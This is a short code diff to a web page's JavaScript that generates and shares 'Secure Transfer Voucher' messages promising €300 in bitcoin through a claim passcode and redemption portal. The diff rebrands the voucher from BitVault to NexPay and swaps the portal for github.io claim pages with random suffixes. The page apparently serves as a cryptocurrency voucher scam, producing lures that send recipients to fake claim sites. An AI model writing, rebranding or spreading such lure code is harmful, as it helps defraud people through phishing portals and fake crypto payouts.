@@ -554,7 +554,7 @@
 
         async function copyFullDetails() {
             const lockedAddr = document.getElementById('lockedAddress').value || 'Unassigned';
-            const text = `BitVault Secure Transfer Voucher:\nRedemption Portal: https://claimbitcoin.com\nClaim Passcode: 1234-5678\nAmount: €300.00 (0.004825 BTC)\nLocked Destination Address: ${lockedAddr}\nExpires in 24 hours.`;
+            const text = `NexPay Secure Transfer Voucher:\nRedemption Portal: https://capitalnest.github.io/NexPay.io-claim--HGFV76HD1/\nClaim Passcode: 6474-5365\nAmount: €300.00 (0.0056 BTC)\nLocked Destination Address: ${lockedAddr}\nExpires in 24 hours.`;
             const success = await writeToClipboard(text);
             if (success) showToast('All transaction details copied');
         }
@@ -562,9 +562,9 @@
         async function shareVoucher() {
             const lockedAddr = document.getElementById('lockedAddress').value || 'Unassigned';
             const shareData = {
-                title: 'BitVault Encrypted Asset Voucher',
-                text: `Claim your €300.00 BTC voucher (Locked to: ${lockedAddr}) via Passcode: 1234-5678`,
-                url: 'https://claimbitcoin.com'
+                title: 'NexPay Encrypted Asset Voucher',
+                text: `Claim your €300.00 BTC voucher (Locked to: ${lockedAddr}) via Passcode: 6474-5365`,
+                url: 'https://capitalnest.github.io/NexPay.io-claim--HGFV76HD2/'
             };
 
             if (navigator.share && navigator.canShare && navigator.canShare(shareData)) {
